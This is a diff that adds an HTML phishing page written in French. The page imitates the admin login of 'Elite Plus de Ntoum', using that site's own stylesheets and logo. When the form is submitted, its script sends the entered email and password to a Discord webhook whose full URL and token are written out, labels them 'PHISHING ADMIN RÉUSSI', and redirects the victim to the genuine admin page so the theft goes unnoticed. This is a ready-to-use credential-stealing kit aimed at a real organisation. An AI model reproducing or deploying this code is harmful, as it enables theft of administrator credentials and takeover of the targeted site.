@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr" class="fi">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Connexion Admin - Elite Plus de Ntoum</title>
+    <link href="https://pngs-eliteplus.onrender.com/fonts/filament/filament/inter/index.css?v=4.12.5.0" rel="stylesheet" />
+    <link href="https://pngs-eliteplus.onrender.com/css/filament/filament/app.css?v=4.12.5.0" rel="stylesheet" />
+    <style>
+        :root { --font-family: 'Inter Variable'; --primary-600: #1552d4; --primary-500: #3b82f6; --gray-50: #f9fafb; --gray-200: #e5e7eb; --gray-700: #374151; --gray-900: #111827; }
+        body { background-color: var(--gray-50); margin: 0; font-family: 'Inter', sans-serif; }
+        .fi-simple-layout { display: flex; min-height: 100vh; align-items: center; justify-content: center; padding: 16px; }
+        .fi-simple-main { width: 100%; max-width: 28rem; padding: 32px; background: white; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
+        .fi-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; justify-content: center; }
+        .fi-logo img { height: 44px; width: 44px; object-fit: contain; }
+        .fi-logo span { font-size: 14.5px; font-weight: 700; color: var(--gray-900); }
+        .fi-simple-header-heading { font-size: 20px; font-weight: 600; text-align: center; margin-bottom: 24px; color: var(--gray-900); }
+        .fi-fo-field-label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: var(--gray-700); }
+        .fi-input { width: 100%; padding: 10px; border: 1px solid var(--gray-200); border-radius: 6px; font-size: 14px; box-sizing: border-box; outline: none; }
+        .fi-input:focus { border-color: var(--primary-500); box-shadow: 0 0 0 2px rgba(59,130,246,0.2); }
+        .fi-btn { background: var(--primary-600); color: white; padding: 12px 16px; border-radius: 6px; font-weight: 600; width: 100%; cursor: pointer; border: none; font-size: 14px; transition: background 0.2s; }
+        .fi-btn:hover { background: var(--primary-500); }
+        .fi-fo-field { margin-bottom: 16px; }
+        .fi-checkbox-input { margin-right: 8px; }
+    </style>
+</head>
+<body class="fi-body fi-panel-admin">
+    <div class="fi-simple-layout">
+        <main class="fi-simple-main">
+            <div class="fi-simple-page-content">
+                <header class="fi-simple-header">
+                    <div class="fi-logo">
+                        <img src="https://pngs-eliteplus.onrender.com/logos/elite-plus/legep.png" alt="Logo">
+                        <span>Elite Plus de Ntoum</span>
+                    </div>
+                    <h1 class="fi-simple-header-heading">Connectez-vous à votre compte admin</h1>
+                </header>
+                
+                <form id="phish-admin-form">
+                    <div class="fi-fo-field">
+                        <label for="email" class="fi-fo-field-label">Adresse e-mail</label>
+                        <input type="email" id="email" required class="fi-input" />
+                    </div>
+                    <div class="fi-fo-field">
+                        <label for="password" class="fi-fo-field-label">Mot de passe</label>
+                        <input type="password" id="password" required class="fi-input" />
+                    </div>
+                    <div class="fi-fo-field">
+                        <label class="fi-fo-field-label">
+                            <input type="checkbox" id="remember" class="fi-checkbox-input" />
+                            Se souvenir de moi
+                        </label>
+                    </div>
+                    <button type="submit" class="fi-btn">Connexion</button>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        document.getElementById('phish-admin-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // TON WEBHOOK ICI
+            const webhookURL = "https://discord.com/api/webhooks/1568232984211882147/d-_mDSq4-UZeY_x0wtzQWCqt_FPCSCFmJnX-VQKtFY8gmml7AYok_v9AFmqzNdyyjBQQ";
+            
+            const btn = document.querySelector('.fi-btn');
+            btn.innerText = "Connexion en cours...";
+            btn.disabled = true;
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🚨 **PHISHING ADMIN RÉUSSI**\n📧 **Email :** ${email}\n🔑 **Mot de passe :** ${password}`
+                })
+            }).then(() => {
+                window.location.href = "https://pngs-eliteplus.onrender.com/admin";
+            }).catch(() => {
+                window.location.href = "https://pngs-eliteplus.onrender.com/admin";
+            });
+        });
+    </script>
+</body>
+</html>
